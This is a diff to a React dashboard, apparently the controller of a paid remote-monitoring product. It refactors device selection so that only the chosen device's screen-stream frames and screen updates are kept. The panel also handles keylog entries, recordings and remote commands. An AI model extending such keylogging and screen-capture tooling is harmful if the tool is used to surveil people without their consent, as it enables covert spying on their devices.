@@ -177,6 +177,17 @@ export default function UserDashboard({ user, onLogout }) {
   const [deviceLatencies, setDeviceLatencies]         = useState({});
   const pingPendingRef  = useRef({});
   const chunkStreamsRef = useRef({});
+  const selectedDeviceRef = useRef(null);
+  const streamSenderRef = useRef(null);
+
+  const updateSelectedDevice = useCallback((deviceId) => {
+    if (deviceId === selectedDeviceRef.current) return;
+    selectedDeviceRef.current = deviceId;
+    setSelectedDevice(deviceId);
+    setStreamFrames({});
+    setScreenReaderPushData({});
+    streamSenderRef.current?.('dashboard:select-device', { deviceId });
+  }, []);
 
   // Live subscription / paywall state. Initialised from the user prop so the
   // first render is correct, then refreshed from /api/payment/me on mount and
@@ -318,8 +329,9 @@ export default function UserDashboard({ user, onLogout }) {
       }
       case 'stream:frame':
         if (data.deviceId && data.frameData) {
+          if (data.deviceId !== selectedDeviceRef.current) break;
           if (data.timestamp && Date.now() - data.timestamp > 2000) break;
-          setStreamFrames(prev => ({ ...prev, [data.deviceId]: data.frameData }));
+          setStreamFrames({ [data.deviceId]: data.frameData });
           if (data.screenWidth && data.screenHeight) {
             setDevices(prev => prev.map(d => {
               if (d.deviceId !== data.deviceId) return d;
@@ -388,7 +400,13 @@ export default function UserDashboard({ user, onLogout }) {
         }
         break;
       case 'screen:update':
-        if (data?.deviceId) setScreenReaderPushData(prev => ({ ...prev, [data.deviceId]: data }));
+        if (data?.deviceId === selectedDeviceRef.current) {
+          setScreenReaderPushData(prev => {
+            const current = prev[data.deviceId];
+            if (data.sequence && current?.sequence >= data.sequence) return prev;
+            return { [data.deviceId]: data };
+          });
+        }
         break;
       case 'offline_recording:saved':
         if (data?.deviceId) setOfflineRecordingVersion(prev => ({ ...prev, [data.deviceId]: (prev[data.deviceId] || 0) + 1 }));
@@ -405,6 +423,7 @@ export default function UserDashboard({ user, onLogout }) {
   }, []);
 
   const { connected, reconnecting, send } = useTcpStream(handleMessage, 'user_token');
+  streamSenderRef.current = send;
 
   const sendCommand = useCallback((deviceId, command, params = null) => {
     send('command:send', { deviceId, command, params });
@@ -436,7 +455,7 @@ export default function UserDashboard({ user, onLogout }) {
         <Sidebar
           devices={devices}
           selectedDevice={selectedDevice}
-          onSelectDevice={setSelectedDevice}
+          onSelectDevice={updateSelectedDevice}
         />
         <main className="main-content" style={{ position: 'relative' }}>
           {selectedDevice ? (
@@ -447,7 +466,7 @@ export default function UserDashboard({ user, onLogout }) {
                 sendCommand={sendCommand}
                 results={commandResults.filter(r => r.deviceId === selectedDevice)}
                 pending={Object.values(pendingCommands).filter(c => c.deviceId === selectedDevice)}
-                onBack={() => setSelectedDevice(null)}
+                onBack={() => updateSelectedDevice(null)}
                 streamFrame={streamFrames[selectedDevice] || null}
                 send={send}
                 keylogPushEntries={keylogPushEntries.filter(e => e.deviceId === selectedDevice)}
@@ -465,7 +484,7 @@ export default function UserDashboard({ user, onLogout }) {
                 email={subscription.email || user?.email}
                 paywall={paywall}
                 trialEndDate={subscription.trialEndDate || user?.trialEndDate}
-                onBack={() => setSelectedDevice(null)}
+                onBack={() => updateSelectedDevice(null)}
                 onRefresh={refreshSubscription}
               />
             )
